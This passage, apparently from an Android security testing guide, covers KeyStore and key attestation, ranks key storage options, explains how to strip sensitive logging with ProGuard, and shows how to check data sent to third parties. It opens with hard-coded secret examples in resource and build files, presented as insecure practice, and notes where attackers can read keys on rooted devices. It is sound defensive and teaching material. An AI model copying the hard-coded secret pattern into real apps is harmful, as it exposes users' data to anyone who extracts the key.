    \KeywordTok{<string}\OtherTok{ name=}\StringTok{"hello\_world"}\KeywordTok{>}\NormalTok{Hello world!}\KeywordTok{</string>}
    \KeywordTok{<string}\OtherTok{ name=}\StringTok{"action\_settings"}\KeywordTok{>}\NormalTok{Settings}\KeywordTok{</string>}
    \KeywordTok{<string}\OtherTok{ name=}\StringTok{"secret\_key"}\KeywordTok{>}\NormalTok{My\_Secret\_Key}\KeywordTok{</string>}
  \KeywordTok{</resources>}
\end{Highlighting}
\end{Shaded}
\item
  build configs, such as in local.properties or gradle.properties
  Example:

\begin{verbatim}
buildTypes {
  debug {
    minifyEnabled true
    buildConfigField "String", "hiddenPassword", "\"${hiddenPassword}\""
  }
}
\end{verbatim}
\end{itemize}

\hypertarget{keystore}{%
\subparagraph{KeyStore}\label{keystore}}

The
\href{https://www.androidauthority.com/use-android-keystore-store-passwords-sensitive-information-623779/}{Android
KeyStore} supports relatively secure credential storage. As of Android
4.3 (API level 18), it provides public APIs for storing and using
app-private keys. An app can use a public key to create a new
private/public key pair for encrypting application secrets, and it can
decrypt the secrets with the private key.

You can protect keys stored in the Android KeyStore with user
authentication in a confirm credential flow. The user's lock screen
credentials (pattern, PIN, password, or fingerprint) are used for
authentication.

You can use stored keys in one of two modes:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Users are authorized to use keys for a limited period of time after
  authentication. In this mode, all keys can be used as soon as the user
  unlocks the device. You can customize the period of authorization for
  each key. You can use this option only if the secure lock screen is
  enabled. If the user disables the secure lock screen, all stored keys
  will become permanently invalid.
\item
  Users are authorized to use a specific cryptographic operation that is
  associated with one key. In this mode, users must request a separate
  authorization for each operation that involves the key. Currently,
  fingerprint authentication is the only way to request such
  authorization.
\end{enumerate}

The level of security afforded by the Android KeyStore depends on its
implementation, which depends on the device. Most modern devices offer a
\href{0x05d-Testing-Data-Storage.md\#hardware-backed-android-keyStore}{hardware-backed
KeyStore implementation}: keys are generated and used in a Trusted
Execution Environment (TEE) or a Secure Element (SE), and the operating
system can't access them directly. This means that the encryption keys
themselves can't be easily retrieved, even from a rooted device. You can
verify hardware-backed keys with
\href{0x05d-Testing-Data-Storage.md\#key-attestation}{Key Attestation}
You can determine whether the keys are inside the secure hardware by
checking the return value of the \texttt{isInsideSecureHardware} method,
which is part of the
\href{https://developer.android.com/reference/android/security/keystore/KeyInfo.html}{\texttt{KeyInfo}
class}.

\begin{quote}
Note that the relevant KeyInfo indicates that secret keys and HMAC keys
are insecurely stored on several devices despite private keys being
correctly stored on the secure hardware.
\end{quote}

The keys of a software-only implementation are encrypted with a
\href{https://nelenkov.blogspot.sg/2013/08/credential-storage-enhancements-android-43.html}{per-user
encryption master key}. An attacker can access all keys stored on rooted
devices that have this implementation in the folder
\texttt{/data/misc/keystore/}. Because the user's lock screen
pin/password is used to generate the master key, the Android KeyStore is
unavailable when the device is locked. For more security Android 9 (API
level 28) introduces the \texttt{unlockedDeviceRequied} flag. By passing
\texttt{true} to the \texttt{setUnlockedDeviceRequired} method the app
prevents its keys stored in \texttt{AndroidKeystore} from being
decrypted when the device is locked, and it requires the screen to be
unlocked before allowing decryption.

Hardware-backed Android KeyStore

As mentioned before, hardware-backed Android KeyStore gives another
layer to defense-in-depth security concept for Android. Keymaster
Hardware Abstraction Layer (HAL) was introduced with Android 6 (API
level 23). Applications can verify if the key is stored inside the
security hardware (by checking if
\texttt{KeyInfo.isinsideSecureHardware} returns \texttt{true}). Devices
running Android 9 (API level 28) and higher can have a
\texttt{StrongBox\ Keymaster} module, an implementation of the Keymaster
HAL that resides in a hardware security module which has its own CPU,
Secure storage, a true random number generator and a mechanism to resist
package tampering. To use this feature, \texttt{true} must be passed to
the \texttt{setIsStrongBoxBacked} method in either the
\texttt{KeyGenParameterSpec.Builder} class or the
\texttt{KeyProtection.Builder} class when generating or importing keys
using \texttt{AndroidKeystore}. To make sure that StrongBox is used
during runtime, check that \texttt{isInsideSecureHardware} returns
\texttt{true} and that the system does not throw
\texttt{StrongBoxUnavailableException} which gets thrown if the
StrongBox Keymaster isn't available for the given algorithm and key size
associated with a key. Description of features on hardware-based
keystore can be found on
\href{https://source.android.com/security/keystore}{AOSP pages}.

Keymaster HAL is an interface to hardware-backed components - Trusted
Execution Environment (TEE) or a Secure Element (SE), which is used by
Android Keystore. An example of such a hardware-backed component is
\href{https://android-developers.googleblog.com/2018/10/building-titan-better-security-through.html}{Titan
M}.

Key Attestation

For the applications which heavily rely on Android Keystore for
business-critical operations such as multi-factor authentication through
cryptographic primitives, secure storage of sensitive data at the
client-side, etc. Android provides the feature of
\href{https://developer.android.com/training/articles/security-key-attestation}{Key
Attestation} which helps to analyze the security of cryptographic
material managed through Android Keystore. From Android 8.0 (API level
26), the key attestation was made mandatory for all new (Android 7.0 or
higher) devices that need to have device certification for Google apps.
Such devices use attestation keys signed by the
\href{https://developer.android.com/training/articles/security-key-attestation\#root_certificate}{Google
hardware attestation root certificate} and the same can be verified
through the key attestation process.

During key attestation, we can specify the alias of a key pair and in
return, get a certificate chain, which we can use to verify the
properties of that key pair. If the root certificate of the chain is the
\href{https://developer.android.com/training/articles/security-key-attestation\#root_certificate}{Google
Hardware Attestation Root certificate} and the checks related to key
pair storage in hardware are made it gives an assurance that the device
supports hardware-level key attestation and the key is in the
hardware-backed keystore that Google believes to be secure.
Alternatively, if the attestation chain has any other root certificate,
then Google does not make any claims about the security of the hardware.

Although the key attestation process can be implemented within the
application directly but it is recommended that it should be implemented
at the server-side for security reasons. The following are the
high-level guidelines for the secure implementation of Key Attestation:

\begin{itemize}
\tightlist
\item
  The server should initiate the key attestation process by creating a
  random number securely using CSPRNG(Cryptographically Secure Random
  Number Generator) and the same should be sent to the user as a
  challenge.
\item
  The client should call the \texttt{setAttestationChallenge} API with
  the challenge received from the server and should then retrieve the
  attestation certificate chain using the
  \texttt{KeyStore.getCertificateChain} method.
\item
  The attestation response should be sent to the server for the
  verification and following checks should be performed for the
  verification of the key attestation response:

  \begin{itemize}
  \tightlist
  \item
    Verify the certificate chain, up to the root and perform certificate
    sanity checks such as validity, integrity and trustworthiness. Check
    the
    \href{https://developer.android.com/training/articles/security-key-attestation\#root_certificat}{Certificate
    Revocation Status List} maintained by Google, if none of the
    certificates in the chain was revoked.
  \item
    Check if the root certificate is signed with the Google attestation
    root key which makes the attestation process trustworthy.
  \item
    Extract the attestation
    \href{https://developer.android.com/training/articles/security-key-attestation\#certificate_schema}{certificate
    extension data}, which appears within the first element of the
    certificate chain and perform the following checks:

    \begin{itemize}
    \tightlist
    \item
      Verify that the attestation challenge is having the same value
      which was generated at the server while initiating the attestation
      process.
    \item
      Verify the signature in the key attestation response.
    \item
      Verify the security level of the Keymaster to determine if the
      device has secure key storage mechanism. Keymaster is a piece of
      software that runs in the security context and provides all the
      secure keystore operations. The security level will be one of
      \texttt{Software}, \texttt{TrustedEnvironment} or
      \texttt{StrongBox}. The client supports hardware-level key
      attestation if security level is \texttt{TrustedEnvironment} or
      \texttt{StrongBox} and attestation certificate chain contains a
      root certificate singed with Google attestation root key.
    \item
      Verify client's status to ensure full chain of trust - verified
      boot key, locked bootloader and verified boot state.
    \item
      Additionally, you can verify the key pair's attributes such as
      purpose, access time, authentication requirement, etc.
    \end{itemize}
  \end{itemize}
\end{itemize}

\begin{quote}
Note, if for any reason that process fails, it means that the key is not
in security hardware. That does not mean that the key is compromised.
\end{quote}

The typical example of Android Keystore attestation response looks like
this:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{\{}
    \DataTypeTok{"fmt"}\FunctionTok{:} \StringTok{"android{-}key"}\FunctionTok{,}
    \DataTypeTok{"authData"}\FunctionTok{:} \StringTok{"9569088f1ecee3232954035dbd10d7cae391305a2751b559bb8fd7cbb229bd..."}\FunctionTok{,}
    \DataTypeTok{"attStmt"}\FunctionTok{:} \FunctionTok{\{}
        \DataTypeTok{"alg"}\FunctionTok{:} \DecValTok{{-}7}\FunctionTok{,}
        \DataTypeTok{"sig"}\FunctionTok{:} \StringTok{"304402202ca7a8cfb6299c4a073e7e022c57082a46c657e9e53..."}\FunctionTok{,}
        \DataTypeTok{"x5c"}\FunctionTok{:} \OtherTok{[}
            \StringTok{"308202ca30820270a003020102020101300a06082a8648ce3d040302308188310b30090603550406130..."}\OtherTok{,}
            \StringTok{"308202783082021ea00302010202021001300a06082a8648ce3d040302308198310b300906035504061..."}\OtherTok{,}
            \StringTok{"3082028b30820232a003020102020900a2059ed10e435b57300a06082a8648ce3d040302308198310b3..."}
        \OtherTok{]}
    \FunctionTok{\}}
\FunctionTok{\}}
\end{Highlighting}
\end{Shaded}

In the above JSON snippet, the keys have the following meaning:
\texttt{fmt}: Attestation statement format identifier \texttt{authData}:
It denotes the authenticator data for the attestation \texttt{alg}: The
algorithm that is used for the Signature \texttt{sig}: Signature
\texttt{x5c}: Attestation certificate chain

Note: The \texttt{sig} is generated by concatenating \texttt{authData}
and \texttt{clientDataHash} (challenge sent by the server) and signing
through the credential private key using the \texttt{alg} signing
algorithm and the same is verified at the server-side by using the
public key in the first certificate.

For more understanding on the implementation guidelines,
\href{https://github.com/googlesamples/android-key-attestation/blob/master/server/src/main/java/com/android/example/KeyAttestationExample.java}{Google
Sample Code} can be referred.

For the security analysis perspective the analysts may perform the
following checks for the secure implementation of Key Attestation:

\begin{itemize}
\tightlist
\item
  Check if the key attestation is totally implemented at the
  client-side. In such scenario, the same can be easily bypassed by
  tampering the application, method hooking, etc.
\item
  Check if the server uses random challenge while initiating the key
  attestation. As failing to do that would lead to insecure
  implementation thus making it vulnerable to replay attacks. Also,
  checks pertaining to the randomness of the challenge should be
  performed.
\item
  Check if the server verifies the integrity of key attestation
  response.
\item
  Check if the server performs basic checks such as integrity
  verification, trust verification, validity, etc. on the certificates
  in the chain.
\end{itemize}

Secure Key Import into Keystore

Android 9 (API level 28) adds the ability to import keys securely into
the \texttt{AndroidKeystore}. First \texttt{AndroidKeystore} generates a
key pair using \texttt{PURPOSE\_WRAP\_KEY} which should also be
protected with an attestation certificate, this pair aims to protect the
Keys being imported to \texttt{AndroidKeystore}. The encrypted keys are
generated as ASN.1-encoded message in the \texttt{SecureKeyWrapper}
format which also contains a description of the ways the imported key is
allowed to be used. The keys are then decrypted inside the
\texttt{AndroidKeystore} hardware belonging to the specific device that
generated the wrapping key so they never appear as plaintext in the
device's host memory.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{KeyDescription ::= SEQUENCE \{}
\NormalTok{    keyFormat INTEGER,}
\NormalTok{    authorizationList AuthorizationList}
\NormalTok{\}}

\NormalTok{SecureKeyWrapper ::= SEQUENCE \{}
\NormalTok{    wrapperFormatVersion INTEGER,}
\NormalTok{    encryptedTransportKey OCTET\_STRING,}
\NormalTok{    initializationVector OCTET\_STRING,}
\NormalTok{    keyDescription KeyDescription,}
\NormalTok{    secureKey OCTET\_STRING,}
\NormalTok{    tag OCTET\_STRING}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

The code above present the different parameters to be set when
generating the encrypted keys in the SecureKeyWrapper format. Check the
Android documentation on
\href{https://developer.android.com/reference/android/security/keystore/WrappedKeyEntry}{\texttt{WrappedKeyEntry}}
for more details.

When defining the KeyDescription AuthorizationList, the following
parameters will affect the encrypted keys security:

\begin{itemize}
\tightlist
\item
  The \texttt{algorithm} parameter Specifies the cryptographic algorithm
  with which the key is used
\item
  The \texttt{keySize} parameter Specifies the size, in bits, of the
  key, measuring in the normal way for the key's algorithm
\item
  The \texttt{digest} parameter Specifies the digest algorithms that may
  be used with the key to perform signing and verification operations
\end{itemize}

Older KeyStore Implementations

Older Android versions don't include KeyStore, but they \emph{do}
include the KeyStore interface from JCA (Java Cryptography
Architecture). You can use KeyStores that implement this interface to
ensure the secrecy and integrity of keys stored with KeyStore;
BouncyCastle KeyStore (BKS) is recommended. All implementations are
based on the fact that files are stored on the filesystem; all files are
password-protected. To create one, you can use the
\texttt{KeyStore.getInstance("BKS",\ "BC")\ method}, where ``BKS'' is
the KeyStore name (BouncyCastle Keystore) and ``BC'' is the provider
(BouncyCastle). You can also use SpongyCastle as a wrapper and
initialize the KeyStore as follows:
\texttt{KeyStore.getInstance("BKS",\ "SC")}.

Be aware that not all KeyStores properly protect the keys stored in the
KeyStore files.

\hypertarget{keychain}{%
\subparagraph{KeyChain}\label{keychain}}

The
\href{https://developer.android.com/reference/android/security/KeyChain.html}{KeyChain
class} is used to store and retrieve \emph{system-wide} private keys and
their corresponding certificates (chain). The user will be prompted to
set a lock screen pin or password to protect the credential storage if
something is being imported into the KeyChain for the first time. Note
that the KeyChain is system-wide---every application can access the
materials stored in the KeyChain.

Inspect the source code to determine whether native Android mechanisms
identify sensitive information. Sensitive information should be
encrypted, not stored in clear text. For sensitive information that must
be stored on the device, several API calls are available to protect the
data via the \texttt{KeyChain} class. Complete the following steps:

\begin{itemize}
\tightlist
\item
  Make sure that the app is using the Android KeyStore and Cipher
  mechanisms to securely store encrypted information on the device. Look
  for the patterns \texttt{AndroidKeystore},
  \texttt{import\ java.security.KeyStore},
  \texttt{import\ javax.crypto.Cipher},
  \texttt{import\ java.security.SecureRandom}, and corresponding usages.
\item
  Use the \texttt{store(OutputStream\ stream,\ char{[}{]}\ password)}
  function to store the KeyStore to disk with a password. Make sure that
  the password is provided by the user, not hard-coded.
\end{itemize}

\hypertarget{storing-a-key---example}{%
\subparagraph{Storing a Key - example}\label{storing-a-key---example}}

To mitigate unauthorized use of keys on the Android device, Android
KeyStore lets apps specify authorized uses of their keys when generating
or importing the keys. Once made, authorizations cannot be changed.

Storing a Key - from most secure to least secure:

\begin{itemize}
\tightlist
\item
  the key is stored in hardware-backed Android KeyStore
\item
  all keys are stored on server and are available after strong
  authentication
\item
  master key is stored on server and use to encrypt other keys, which
  are stored in Android SharedPreferences
\item
  the key is derived each time from a strong user provided passphrase
  with sufficient length and salt
\item
  the key is stored in software implementation of Android KeyStore
\item
  master key is stored in software implementation of Android Keystore
  and use to encrypt other keys, which are stored in SharedPreferences
\item
  {[}not recommended{]} all keys are stored in SharedPreferences
\item
  {[}not recommended{]} hardcoded encryption keys in the source code
\item
  {[}not recommended{]} predictable key derivation function based on
  stable attributes
\item
  {[}not recommended{]} stored generated keys in public places (like
  \texttt{/sdcard/})
\end{itemize}

The most secure way of handling key material, is simply never storing it
on the device. That can be achieved by using
\href{0x05d-Testing-Data-Storage.md\#hardware-backed-android-keystore}{hardware-backed
Android KeyStore} if device is running Android 7.0 (API level 24) and
above with available hardware component (Trusted Execution Environment
(TEE) or a Secure Element (SE)). That can be check by using guidelines
provided for \href{0x05d-Testing-Data-Storage.md\#key-attestation}{the
secure implementation of Key Attestation}. If hardware component is not
available and/or support for Android 6.0 (API level 23) and below is
required, then that can be achieved by storing a key on remote server
and make a key available after authentication.

\begin{quote}
Please note that if the keys are stored on the server, the app need to
be online to decrypt the data. This might be a limitation in some use
case of mobile apps and should be carefully thought through as this
becomes part of the architecture of the app.
\end{quote}

A more common solution (regarding Android API level), however less-user
friendly and with some weaknesses is to derive a key from user provided
passphrase. This means that the user should be prompted to input a
passphrase every time the application needs to perform a cryptographic
operation. This is not the ideal implementation from a user point of
view and passwords or pass-phrases might be reused by the user or easy
to guess. However this approach makes a key available in an array in
memory while it is being used and when the key is not needed anymore,
the array can be zeroed out. This limits the available ways of attacks
on a key as no key material and its artifacts (like a passphrase) touch
the filesystem and they are not stored. However there are some
weaknesses which need to be taken into consideration. First of all, a
key derived from passphrase has
\href{0x04g-Testing-Cryptography.md\#weak-key-generation-functions}{its
own weaknesses}. Additionally, the key material should be cleared out
from memory as soon as it is not need anymore. However, note that some
ciphers do not properly clean up their byte-arrays. For instance, the
AES Cipher in BouncyCastle does not always clean up its latest working
key leaving some copies of the byte-array in memory. Next, BigInteger
based keys (e.g.~private keys) cannot be removed from the heap nor
zeroed out just like that. Clearing byte array can be achieved by
writing a wrapper which implements
\href{https://docs.oracle.com/javase/8/docs/api/javax/security/auth/Destroyable.html\#destroy--}{Destroyable}.

More user-friendly and recommended way is to use the
\href{https://developer.android.com/reference/java/security/KeyStore.html}{Android
KeyStore API} system (itself or through KeyChain) to store key material.
If it is possible, hardware-backed storage should be used. Otherwise, it
should fallback to software implementation of Android Keystore. However,
be aware that the \texttt{AndroidKeyStore} API has been changed
significantly throughout various versions of Android. In earlier
versions, the \texttt{AndroidKeyStore} API only supported storing
public/private key pairs (e.g., RSA). Symmetric key support has only
been added since Android 6.0 (API level 23). As a result, a developer
needs to handle the different Android API levels to securely store
symmetric keys.

In order to securely store symmetric keys on devices running on Android
5.1 (API level 22) or lower, we need to generate a public/private key
pair. We encrypt the symmetric key using the public key and store the
private key in the \texttt{AndroidKeyStore}. The encrypted symmetric key
can encoded using base64 and stored in the \texttt{SharedPreferences}.
Whenever we need the symmetric key, the application retrieves the
private key from the \texttt{AndroidKeyStore} and decrypts the symmetric
key.

A less secure way of storing encryption keys, is in the
SharedPreferences of Android. When
\href{https://developer.android.com/reference/android/content/SharedPreferences.html}{SharedPreferences}
are used, the file is only readable by the application that created it.
However, on rooted devices any other application with root access can
simply read the SharedPreference file of other apps. This is not the
case for the AndroidKeyStore. Since AndroidKeyStore access is managed on
kernel level, which needs considerably more work and skill to bypass
without the AndroidKeyStore clearing or destroying the keys.

The last three options are to use hardcoded encryption keys in the
source code, having a predictable key derivation function based on
stable attributes, and storing generated keys in public places like
\texttt{/sdcard/}. Obviously, hardcoded encryption keys are not the way
to go. This means every instance of the application uses the same
encryption key. An attacker needs only to do the work once, to extract
the key from the source code - whether stored natively or in
Java/Kotlin. Consequently, an attacker can decrypt any other data which
was encrypted by the application. Next, when you have a predictable key
derivation function based on identifiers which are accessible to other
applications, the attacker only needs to find the KDF and apply it to
the device in order to find the key. Lastly, storing encryption keys
publicly also is highly discouraged as other applications can have
permission to read the public partition and steal the keys.

\hypertarget{third-party-libraries}{%
\subparagraph{Third Party libraries}\label{third-party-libraries}}

There are several different open-source libraries that offer encryption
capabilities specific for the Android platform.

\begin{itemize}
\tightlist
\item
  \textbf{\href{https://github.com/tozny/java-aes-crypto}{Java AES
  Crypto}} - A simple Android class for encrypting and decrypting
  strings.
\item
  \textbf{\href{https://www.zetetic.net/sqlcipher/sqlcipher-for-android/}{SQL
  Cipher}} - SQLCipher is an open source extension to SQLite that
  provides transparent 256-bit AES encryption of database files.
\item
  \textbf{\href{https://github.com/scottyab/secure-preferences}{Secure
  Preferences}} - Android Shared preference wrapper than encrypts the
  keys and values of Shared Preferences.
\end{itemize}

\begin{quote}
Please keep in mind that as long as the key is not stored in the
KeyStore, it is always possible to easily retrieve the key on a rooted
device and then decrypt the values you are trying to protect.
\end{quote}

\hypertarget{dynamic-analysis-9}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-9}}

Install and use the app, executing all functions at least once. Data can
be generated when entered by the user, sent by the endpoint, or shipped
with the app. Then complete the following:

\begin{itemize}
\tightlist
\item
  Identify development files, backup files, and old files that shouldn't
  be included with a production release.
\item
  Determine whether SQLite databases are available and whether they
  contain sensitive information. SQLite databases are stored in
  \texttt{/data/data/\textless{}package-name\textgreater{}/databases}.
\item
  Check Shared Preferences that are stored as XML files (in
  \texttt{/data/data/\textless{}package-name\textgreater{}/shared\_prefs})
  for sensitive information. Avoid using Shared Preferences and other
  mechanisms that can't protect data when you are storing sensitive
  information. Shared Preferences is insecure and unencrypted by
  default. You can use
  \href{https://github.com/scottyab/secure-preferences}{secure-preferences}
  to encrypt the values stored in Shared Preferences, but the Android
  KeyStore should be your first choice for storing data securely.
\item
  Check the permissions of the files in
  \texttt{/data/data/\textless{}package-name\textgreater{}}. Only the
  user and group created when you installed the app (e.g., u0\_a82)
  should have user read, write, and execute permissions (\texttt{rwx}).
  Other users should not have permission to access files, but they may
  have execute permissions for directories.
\item
  Determine whether a Realm database is available in
  \texttt{/data/data/\textless{}package-name\textgreater{}/files/},
  whether it is unencrypted, and whether it contains sensitive
  information. By default, the file extension is \texttt{realm} and the
  file name is \texttt{default}. Inspect the Realm database with the
  \href{https://github.com/realm/realm-browser-osx}{Realm Browser}.
\item
  Check external storage for data. Don't use external storage for
  sensitive data because it is readable and writeable system-wide.
\end{itemize}

Files saved to internal storage are by default private to your
application; neither the user nor other applications can access them.
When users uninstall your application, these files are removed.

\hypertarget{testing-local-storage-for-input-validation-mstg-platform-2}{%
\subsubsection{Testing Local Storage for Input Validation
(MSTG-PLATFORM-2)}\label{testing-local-storage-for-input-validation-mstg-platform-2}}

For any publicly accessible data storage, any process can override the
data. This means that input validation needs to be applied the moment
the data is read back again.

\begin{quote}
Note: Similar holds for private accessible data on a rooted device
\end{quote}

\hypertarget{static-analysis-12}{%
\paragraph{Static analysis}\label{static-analysis-12}}

\hypertarget{using-shared-preferences}{%
\subparagraph{Using Shared Preferences}\label{using-shared-preferences}}

When you use the \texttt{SharedPreferences.Editor} to read or write
int/boolean/long values, you cannot check whether the data is overridden
or not. However: it can hardly be used for actual attacks other than
chaining the values (e.g.~no additional exploits can be packed which
will take over the control flow). In the case of a \texttt{String} or a
\texttt{StringSet} you should be careful with how the data is
interpreted. Using reflection based persistence? Check the section on
``Testing Object Persistence'' for Android to see how it should be
validated. Using the \texttt{SharedPreferences.Editor} to store and read
certificates or keys? Make sure you have patched your security provider
given vulnerabilities such as found in
\href{https://www.cvedetails.com/cve/CVE-2018-1000613/}{Bouncy Castle}.

In all cases, having the content HMACed can help to ensure that no
additions and/or changes have been applied.

\hypertarget{using-other-storage-mechanisms}{%
\subparagraph{Using Other Storage
Mechanisms}\label{using-other-storage-mechanisms}}

In case other public storage mechanisms (than the
\texttt{SharedPreferences.Editor}) are used, the data needs to be
validated the moment it is read from the storage mechanism.

\hypertarget{testing-logs-for-sensitive-data-mstg-storage-3}{%
\subsubsection{Testing Logs for Sensitive Data
(MSTG-STORAGE-3)}\label{testing-logs-for-sensitive-data-mstg-storage-3}}

\hypertarget{overview-5}{%
\paragraph{Overview}\label{overview-5}}

There are many legitimate reasons to create log files on a mobile
device, such as keeping track of crashes, errors, and usage statistics.
Log files can be stored locally when the app is offline and sent to the
endpoint once the app is online. However, logging sensitive data may
expose the data to attackers or malicious applications, and it violates
user confidentiality. You can create log files in several ways. The
following list includes two classes that are available for Android:

\begin{itemize}
\tightlist
\item
  \href{https://developer.android.com/reference/android/util/Log.html}{Log
  Class}
\item
  \href{https://developer.android.com/reference/java/util/logging/Logger.html}{Logger
  Class}
\end{itemize}

Use a centralized logging class and mechanism and remove logging
statements from the production release because other applications may be
able to read them.

\hypertarget{static-analysis-13}{%
\paragraph{Static Analysis}\label{static-analysis-13}}

You should check the apps' source code for logging mechanisms by
searching for the following keywords:

\begin{itemize}
\tightlist
\item
  Functions and classes, such as:

  \begin{itemize}
  \tightlist
  \item
    \texttt{android.util.Log}
  \item
    \texttt{Log.d} \textbar{} \texttt{Log.e} \textbar{} \texttt{Log.i}
    \textbar{} \texttt{Log.v} \textbar{} \texttt{Log.w} \textbar{}
    \texttt{Log.wtf}
  \item
    \texttt{Logger}
  \end{itemize}
\item
  Keywords and system output:

  \begin{itemize}
  \tightlist
  \item
    \texttt{System.out.print} \textbar{} \texttt{System.err.print}
  \item
    logfile
  \item
    logging
  \item
    logs
  \end{itemize}
\end{itemize}

While preparing the production release, you can use tools like
\texttt{ProGuard} (included in Android Studio).
\href{https://www.guardsquare.com/en/products/proguard}{ProGuard} is a
free Java class file shrinker, optimizer, obfuscator, and preverifier.
It detects and removes unused classes, fields, methods, and attributes
and can also be used to delete logging-related code.

To determine whether all logging functions from the
\texttt{android.util.Log} class have been removed, check the ProGuard
configuration file (proguard-rules.pro) for the following options
(according to this
\href{https://www.guardsquare.com/en/products/proguard/manual/examples\#logging}{example
of removing logging code} and this article about
\href{https://developer.android.com/studio/build/shrink-code\#enable}{enabling
ProGuard in an Android Studio project}):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{{-}assumenosideeffects }\KeywordTok{class}\NormalTok{ android.}\FunctionTok{util}\NormalTok{.}\FunctionTok{Log}
\NormalTok{\{}
  \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{boolean} \FunctionTok{isLoggable}\NormalTok{(java.}\FunctionTok{lang}\NormalTok{.}\FunctionTok{String}\NormalTok{, }\DataTypeTok{int}\NormalTok{);}
  \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{int} \FunctionTok{v}\NormalTok{(...);}
  \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{int} \FunctionTok{i}\NormalTok{(...);}
  \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{int} \FunctionTok{w}\NormalTok{(...);}
  \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{int} \FunctionTok{d}\NormalTok{(...);}
  \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{int} \FunctionTok{e}\NormalTok{(...);}
  \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{int} \FunctionTok{wtf}\NormalTok{(...);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Note that the example above only ensures that calls to the Log class'
methods will be removed. If the string that will be logged is
dynamically constructed, the code that constructs the string may remain
in the bytecode. For example, the following code issues an implicit
\texttt{StringBuilder} to construct the log statement:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Log.}\FunctionTok{v}\NormalTok{(}\StringTok{"Private key tag"}\NormalTok{, }\StringTok{"Private key [byte format]: "}\NormalTok{ + key);}
\end{Highlighting}
\end{Shaded}

The compiled bytecode, however, is equivalent to the bytecode of the
following log statement, which constructs the string explicitly:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Log.}\FunctionTok{v}\NormalTok{(}\StringTok{"Private key tag"}\NormalTok{, }\KeywordTok{new} \BuiltInTok{StringBuilder}\NormalTok{(}\StringTok{"Private key [byte format]: "}\NormalTok{).}\FunctionTok{append}\NormalTok{(key.}\FunctionTok{toString}\NormalTok{()).}\FunctionTok{toString}\NormalTok{());}
\end{Highlighting}
\end{Shaded}

ProGuard guarantees removal of the \texttt{Log.v} method call. Whether
the rest of the code (\texttt{new\ StringBuilder\ ...}) will be removed
depends on the complexity of the code and the
\href{https://stackoverflow.com/questions/6009078/removing-unused-strings-during-proguard-optimisation}{ProGuard
version}.

This is a security risk because the (unused) string leaks plain text
data into memory, which can be accessed via a debugger or memory
dumping.

Unfortunately, no silver bullet exists for this issue, but one option
would be to implement a custom logging facility that takes simple
arguments and constructs the log statements internally.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{SecureLog.}\FunctionTok{v}\NormalTok{(}\StringTok{"Private key [byte format]: "}\NormalTok{, key);}
\end{Highlighting}
\end{Shaded}

Then configure ProGuard to strip its calls.

\hypertarget{dynamic-analysis-10}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-10}}

Use all the mobile app functions at least once, then identify the
application's data directory and look for log files
(\texttt{/data/data/\textless{}package-name\textgreater{}}). Check the
application logs to determine whether log data has been generated; some
mobile applications create and store their own logs in the data
directory.

Many application developers still use \texttt{System.out.println} or
\texttt{printStackTrace} instead of a proper logging class. Therefore,
your testing strategy must include all output generated while the
application is starting, running and closing. To determine what data is
directly printed by \texttt{System.out.println} or
\texttt{printStackTrace}, you can use
\href{https://developer.android.com/tools/debugging/debugging-log.html}{\texttt{Logcat}}
as explained in the chapter ``Basic Security Testing'', section
``Monitoring System Logs''.

Remember that you can target a specific app by filtering the Logcat
output as follows:

\begin{verbatim}
$ adb logcat | grep "$(adb shell ps | grep <package-name> | awk '{print $2}')"
\end{verbatim}

\begin{quote}
If you already know the app PID you may give it directly using
\texttt{-\/-pid} flag.
\end{quote}

You may also want to apply further filters or regular expressions (using
\texttt{logcat}'s regex flags
\texttt{-e\ \textless{}expr\textgreater{},\ -\/-regex=\textless{}expr\textgreater{}}
for example) if you expect certain strings or patterns to come up in the
logs.

\hypertarget{determining-whether-sensitive-data-is-sent-to-third-parties-mstg-storage-4}{%
\subsubsection{Determining Whether Sensitive Data is Sent to Third
Parties
(MSTG-STORAGE-4)}\label{determining-whether-sensitive-data-is-sent-to-third-parties-mstg-storage-4}}

\hypertarget{overview-6}{%
\paragraph{Overview}\label{overview-6}}

You can embed third-party services in apps. These services can implement
tracker services, monitor user behavior, sell banner advertisements,
improve the user experience, and more.

The downside is a lack of visibility: you can't know exactly what code
third-party libraries execute. Consequently, you should make sure that
only necessary, non-sensitive information will be sent to the service.

Most third-party services are implemented in one of two ways:

\begin{itemize}
\tightlist
\item
  With a standalone library, such as an Android project Jar that is
  included in the APK
\item
  With a full SDK
\end{itemize}

\hypertarget{static-analysis-14}{%
\paragraph{Static Analysis}\label{static-analysis-14}}

You can automatically integrate third-party libraries into apps by using
an IDE wizard or manually adding a library or SDK. In either case,
review the permissions in the \texttt{AndroidManifest.xml}. In
particular, you should determine whether permissions for accessing
\texttt{SMS\ (READ\_SMS)}, contacts (\texttt{READ\_CONTACTS}), and
location (\texttt{ACCESS\_FINE\_LOCATION}) are really necessary (see
\texttt{Testing\ App\ Permissions}). Developers should check the source
code for changes after the library has been added to the project.

Check the source code for API calls and third-party library functions or
SDKs. Review code changes for security best practices.

Review loaded libraries to determine whether they are necessary and
whether they are out of date or contain known vulnerabilities.

All data sent to third-party services should be anonymized. Data (such
as application IDs) that can be traced to a user account or session
should not be sent to a third party.

\hypertarget{dynamic-analysis-11}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-11}}

Check all requests to external services for embedded sensitive
information. To intercept traffic between the client and server, you can
perform dynamic analysis by launching a man-in-the-middle (MITM) attack
with \emph{Burp Suite Professional} or \emph{OWASP ZAP}. Once you route
the traffic through the interception proxy, you can try to sniff the
traffic that passes between the app and server. All app requests that
aren't sent directly to the server on which the main function is hosted
